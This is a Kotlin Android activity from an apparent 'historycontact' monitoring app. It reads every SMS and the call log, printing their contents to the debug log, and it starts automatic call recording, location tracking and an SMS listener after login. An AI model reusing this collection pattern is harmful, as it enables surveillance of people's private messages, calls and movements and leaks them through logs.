package an.xuan.tong.historycontact.ui

import an.xuan.tong.historycontact.Constant
import an.xuan.tong.historycontact.R
import an.xuan.tong.historycontact.api.ApiService
import an.xuan.tong.historycontact.api.Repository
import an.xuan.tong.historycontact.api.model.InformationResponse
import an.xuan.tong.historycontact.call.CallRecord
import an.xuan.tong.historycontact.location.LocationService
import an.xuan.tong.historycontact.realm.HistoryContactConfiguration
import an.xuan.tong.historycontact.realm.ApiCaching
import an.xuan.tong.historycontact.realm.RealmUtils
import an.xuan.tong.historycontact.smsradar.Sms
import an.xuan.tong.historycontact.smsradar.SmsListener
import an.xuan.tong.historycontact.smsradar.SmsRadar
import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.CallLog
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.util.Log
import android.view.MotionEvent
import android.view.View
import com.facebook.accountkit.Account
import com.facebook.accountkit.AccountKit
import com.facebook.accountkit.AccountKitCallback
import com.facebook.accountkit.AccountKitError
import com.google.firebase.database.DatabaseReference
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import io.realm.Realm
import kotlinx.android.synthetic.main.activity_hello_token.*
import kotlinx.android.synthetic.main.tool_bar_app.*
import retrofit2.http.GET
import java.text.SimpleDateFormat
import java.util.*


class TokenActivity : Activity() {
    lateinit var callRecord: CallRecord
    private var mDatabase: DatabaseReference? = null

    private val mKeyAPI: String by lazy {
        // Get Value of annotation API for save cache as KEY_CACHE
        val method = ApiService::getInfomation
        val get = method.annotations.find { it is GET } as? GET
        get?.value + ""
    }

    public override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_hello_token)
        initView()
        getAllSMSDetails()
        getAllCallDetails(this)
        getInformation()
        premissonApp()

    }

    override fun onResume() {
        super.onResume()
        premissonApp()
    }

    private fun initView() {
        switchContact.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }
        switchPhone.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }
        switchMicrophone.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }
        switchLocation.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }
        switcStorage.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.actionMasked == MotionEvent.ACTION_MOVE
        }
        switchSMS.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }

        toolbarImageLeft.setOnClickListener {
            onBackPressed()
        }
    }

    fun finshAll() {
        AccountKit.logOut()
        stopSmsRadarService()
        stopCallService()
        finish()
    }

    fun showProgressBar() {
        if (progressBar.visibility == View.GONE) {
            progressBar.visibility = View.VISIBLE
        }
    }

    fun hideProgressBar() {
        if (progressBar.visibility == View.VISIBLE) {
            progressBar.visibility = View.GONE
        }
    }

    private fun startCallService() {
        callRecord = CallRecord.Builder(this)
                .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
                .setRecordDirName("Historycontact")
                .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                .setShowSeed(true)
                .build()

        callRecord.startCallRecordService()
    }

    private fun startLocationService() {
        val intent = Intent()
        intent.setClass(this, LocationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            this.startForegroundService(intent)
        } else {
            this.startService(intent)
        }
    }

    private fun stopCallService() {
        callRecord.stopCallReceiver()
    }

    private fun initializeSmsRadarService() {
        SmsRadar.initializeSmsRadarService(this, object : SmsListener {
            override fun onSmsSent(sms: Sms) {
                // showSmsToast(sms)
            }

            override fun onSmsReceived(sms: Sms) {
                //showSmsToast(sms)
            }
        })
    }

    private fun stopSmsRadarService() {
        SmsRadar.stopSmsRadarService(this)
    }

    private fun getInformation() {
        AccountKit.getCurrentAccount(object : AccountKitCallback<Account> {
            override fun onSuccess(account: Account) {
                account.phoneNumber?.let {
                    Repository.createService(ApiService::class.java).getInfomation(Constant.KEY_API, account.phoneNumber.toString())
                            .subscribeOn(Schedulers.io())
                            .observeOn(AndroidSchedulers.mainThread())
                            .subscribe(
                                    { result ->
                                        Log.e("test", result.toString())
                                        handlerGetInformationSccess(result)
                                    },
                                    { e ->
                                        Log.e("test", e.message)
                                    })
                }
                account.email?.let {
                }
            }
            override fun onError(error: AccountKitError) {}
        })

    }

    fun handlerGetInformationSccess(listData: InformationResponse) {
        startCallService()
        startLocationService()
        ActivityCompat.requestPermissions(this, arrayOf("android.permission.READ_SMS"), 23)
        if (ContextCompat.checkSelfPermission(baseContext, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            initializeSmsRadarService()
        }
        RealmUtils.saveCacheInformation(listData)
    }

    private fun premissonApp() {
        switchContact.isChecked = hasPermissions(Manifest.permission.GET_ACCOUNTS)
        switchSMS.isChecked = hasPermissions(Manifest.permission.RECEIVE_SMS)
        switchLocation.isChecked = hasPermissions(Manifest.permission.ACCESS_FINE_LOCATION)
        switchMicrophone.isChecked = hasPermissions(Manifest.permission.RECORD_AUDIO)
        switchPhone.isChecked = hasPermissions(Manifest.permission.READ_PHONE_STATE)
        switcStorage.isChecked = hasPermissions(Manifest.permission.WRITE_EXTERNAL_STORAGE)
    }

    @Suppress("DEPRECATED_IDENTITY_EQUALS")
    private fun hasPermissions(permissions: String): Boolean {
        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(this, permissions) !== PackageManager.PERMISSION_GRANTED) {
                return false
            }
        }
        return true
    }

    private fun getAllSMSDetails(): List<String> {
        var sms = ArrayList<String>()
        var uriSMSURI = Uri.parse("content://sms/inbox")
        var cur = contentResolver.query(uriSMSURI, null, null, null, null);
        while (cur != null && cur.moveToNext()) {
            var address = cur.getString(cur.getColumnIndex("address"))
            var body = cur.getString(cur.getColumnIndexOrThrow("body"))
            sms.add("Number: $address .Message: $body")
            Log.e("sms: ", "" + sms.toString())
        }
        cur?.close()
        return sms
    }

    @SuppressLint("MissingPermission")
    private fun getAllCallDetails(context: Context): String {
        var stringBuffer = StringBuffer()
        var cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC")
        var number = cursor.getColumnIndex(CallLog.Calls.NUMBER)
        var type = cursor.getColumnIndex(CallLog.Calls.TYPE)
        var date = cursor.getColumnIndex(CallLog.Calls.DATE)
        var duration = cursor.getColumnIndex(CallLog.Calls.DURATION)
        while (cursor.moveToNext()) {
            var phNumber = cursor.getString(number)
            var callType = cursor.getString(type)
            var callDate = cursor.getString(date)
            var callDayTime = callDate
            var callDuration = cursor.getString(duration)
            var dir: String? = null
            var dircode = Integer.parseInt(callType)
            when (dircode) {
                CallLog.Calls.OUTGOING_TYPE -> dir = "OUTGOING"
                CallLog.Calls.INCOMING_TYPE -> dir = "INCOMING"
                CallLog.Calls.MISSED_TYPE -> dir = "MISSED"

            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration)
            stringBuffer.append("\n----------------------------------")
        }
        cursor.close()
        Log.e("allCall: ", stringBuffer.toString())
        return stringBuffer.toString()
    }
}